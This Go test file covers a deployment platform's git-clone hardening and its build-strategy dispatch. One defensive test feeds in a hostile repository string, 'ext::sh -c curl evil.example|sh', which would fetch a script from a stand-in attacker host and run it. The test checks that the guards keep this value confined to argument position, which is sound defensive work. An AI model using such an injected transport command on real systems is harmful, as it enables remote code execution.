package intake

// buildsource 域白盒（P5 wave-5 拆包随域迁入，通则⑥）：clone argv 防线
//（原 engine buildsource_test 逐字）+ prepareBuildInput 的 strategy 分派
//（原 engine buildroute_test 的应用模块行为面，经端口双底驱动）。

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"google.golang.org/protobuf/encoding/protojson"

	specv1 "github.com/fleetlyrun/fleetly/genproto/fleetly/spec/v1"
	"github.com/fleetlyrun/fleetly/internal/domain/delivery/deployment"
	"github.com/fleetlyrun/fleetly/internal/domain/delivery/revision"
	"github.com/fleetlyrun/fleetly/internal/domain/shared/capability"
	specir "github.com/fleetlyrun/fleetly/internal/domain/shared/spec"
)

// gitCloneArgs 是 cloneSource 的执行面防线（安全批 P0）：传输协议白名单
// （-c protocol.ext/file.allow=never）+ `--` 选项终结。这里钉死 argv 形态
// ——两个 ref 分支都必须带防线，防后续重构悄然退化。
func TestGitCloneArgsHardened(t *testing.T) {
	const repo = "https://github.com/acme/shop.git"
	const dir = "/data/contexts/rev1"

	// 分支形态：浅克隆，-c 防线在 clone 之前、`--` 在 repo 之前。
	branchArgs := gitCloneArgs(repo, "main", dir)
	assert.Equal(t, []string{
		"-c", "protocol.ext.allow=never",
		"-c", "protocol.file.allow=never",
		"clone", "--quiet",
		"--depth", "1", "--branch", "main",
		"--", repo, dir,
	}, branchArgs, "branch-form clone must carry the transport guards and the -- separator")

	// sha 形态：全量 clone + 后置 checkout，防线同款。
	shaArgs := gitCloneArgs(repo, "1111111111111111111111111111111111111111", dir)
	assert.Equal(t, []string{
		"-c", "protocol.ext.allow=never",
		"-c", "protocol.file.allow=never",
		"clone", "--quiet",
		"--", repo, dir,
	}, shaArgs, "sha-form clone must carry the same guards (full clone, no --branch)")
}

// 恶意形态即使穿透受理面（存量行冻结的 repo），argv 里也必须停在参数位：
// repo 值不出现在任何选项位（`--` 之后的两个位置由 repo/dir 占据）。
func TestGitCloneArgsHostileRepoStaysArgument(t *testing.T) {
	hostile := "ext::sh -c curl evil.example|sh"
	args := gitCloneArgs(hostile, "main", "/tmp/x")
	// `--` 之后才允许出现 repo：选项区（`--` 之前）不得含恶意串。
	sep := -1
	for i, a := range args {
		if a == "--" {
			sep = i
			break
		}
	}
	assert.NotEqual(t, -1, sep, "clone argv must contain the -- option terminator")
	assert.Equal(t, hostile, args[sep+1], "the repo must sit strictly after -- (argument position)")
	for _, a := range args[:sep] {
		assert.NotContains(t, a, "ext::", "no option-position token may carry the hostile transport form")
	}
}

// gitBuildSpecJSON 合成 git 源 spec（预置上下文目录跳过 clone；engine 侧
// gitBuildSpec 的隔离副本，build 段可变）。
func gitBuildSpecJSON(buildJSON string) string {
	return `{"schema_version":1,"app":{"id":"` + tAppID + `","project":"` + tProjectID + `"},` +
		`"source":{"git":{"repo":"file:///unused","ref":"main"}},` +
		`"build":` + buildJSON + `,` +
		`"processes":[{"name":"web","from_build":"web","replicas":1}]}`
}

// newSpecFixture 建可解析 spec 的夹具：Revision 落行 + 预置上下文目录 +
// loadSpec 端口绑本地 protojson 解析（核 observ.loadSpec 同式）+ 端点端口
// 返回固定受管端点。
func newSpecFixture(t *testing.T, id, buildJSON string) *fixture {
	t.Helper()
	fx := newFixture(t, func(d *Deps) {
		d.LoadSpec = func(ctx context.Context, revID string) (*specv1.AppSpec, error) {
			row, err := d.Repos.Revisions.Get(ctx, revID)
			if err != nil {
				return nil, err
			}
			spec := &specv1.AppSpec{}
			if err := protojson.Unmarshal(row.Spec, spec); err != nil {
				return nil, err
			}
			return spec, nil
		}
		d.RegistryEndpoint = func(context.Context) (capability.RegistryEndpoint, error) {
			return capability.RegistryEndpoint{Addr: "reg.test:5000", Cred: capability.RegistryCredential{Server: "reg.test:5000", Username: "fleetly", Secret: "test-secret"}}, nil
		}
	})
	ctx := context.Background()
	seq, err := fx.repos.Revisions.NextSeq(ctx, tAppID)
	require.NoError(t, err)
	require.NoError(t, fx.repos.Revisions.Create(ctx, &revision.Revision{
		ID: id, AppID: tAppID, Seq: seq, Spec: []byte(gitBuildSpecJSON(buildJSON)),
	}))
	require.NoError(t, os.MkdirAll(filepath.Join(fx.in.dataRoot(), "contexts", id), 0o750))
	return fx
}

// prepareBuildInputDispatchesStrategy：三 strategy 各自携带路由名与
// strategy 载荷进 BuildRequest；目标/凭证面三 strategy 同构（共享链不变）。
func TestPrepareBuildInputDispatchesStrategy(t *testing.T) {
	cases := []struct {
		name      string
		revID     string
		buildJSON string
		verify    func(t *testing.T, in capability.BuildRequest)
	}{
		{
			name:      "dockerfile",
			revID:     "01JD0REV0000000000000000D1",
			buildJSON: `{"builder":"dockerfile","dockerfile":"Dockerfile"}`,
			verify: func(t *testing.T, in capability.BuildRequest) {
				assert.Equal(t, specir.BuilderDockerfile, in.Builder)
				assert.Equal(t, "Dockerfile", in.Dockerfile)
				assert.Nil(t, in.Railpack)
				assert.Nil(t, in.Static)
			},
		},
		{
			name:      "railpack",
			revID:     "01JD0REV0000000000000000D2",
			buildJSON: `{"builder":"railpack","railpack":{"pinned_version":"0.39.0"}}`,
			verify: func(t *testing.T, in capability.BuildRequest) {
				assert.Equal(t, specir.BuilderRailpack, in.Builder)
				require.NotNil(t, in.Railpack)
				assert.Equal(t, "0.39.0", in.Railpack.PinnedVersion)
				assert.Empty(t, in.Dockerfile)
			},
		},
		{
			name:      "static",
			revID:     "01JD0REV0000000000000000D3",
			buildJSON: `{"builder":"static","static":{"output_dir":"dist"}}`,
			verify: func(t *testing.T, in capability.BuildRequest) {
				assert.Equal(t, specir.BuilderStatic, in.Builder)
				require.NotNil(t, in.Static)
				assert.Equal(t, "dist", in.Static.OutputDir)
				assert.Empty(t, in.Dockerfile)
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			fx := newSpecFixture(t, tc.revID, tc.buildJSON)
			ctx := context.Background()
			spec, err := fx.in.loadSpec(ctx, tc.revID)
			require.NoError(t, err)
			input, err := fx.in.prepareBuildInput(ctx, &deployment.Deployment{AppID: tAppID, ToRevision: tc.revID}, spec, 1, tProjectID)
			require.NoError(t, err)
			tc.verify(t, input)
			assert.Equal(t, LocalImageRef("reg.test:5000", tProjectID, tAppID, 1), input.Target)
			require.NotNil(t, input.PushCred, "the push target and credential are strategy-invariant")
		})
	}
}

// prepareBuildInputLegacySpecRoutesDockerfile：存量行 strategy 缺席
// （F1.14 前的冻结体）防御性走 dockerfile 轨。
func TestPrepareBuildInputLegacySpecRoutesDockerfile(t *testing.T) {
	fx := newSpecFixture(t, "01JD0REV0000000000000000E1", `{"builder":"dockerfile","dockerfile":"Dockerfile"}`)
	ctx := context.Background()
	spec, err := fx.in.loadSpec(ctx, "01JD0REV0000000000000000E1")
	require.NoError(t, err)
	spec.Build.Strategy = nil // 剥掉 strategy：存量防御形态（oneof 字段一并清空）
	input, err := fx.in.prepareBuildInput(ctx, &deployment.Deployment{AppID: tAppID, ToRevision: "01JD0REV0000000000000000E1"}, spec, 1, tProjectID)
	require.NoError(t, err)
	assert.Equal(t, specir.BuilderDockerfile, input.Builder)
	assert.Empty(t, input.Dockerfile, "empty dockerfile rides the port default (\"Dockerfile\"), same semantics")
}
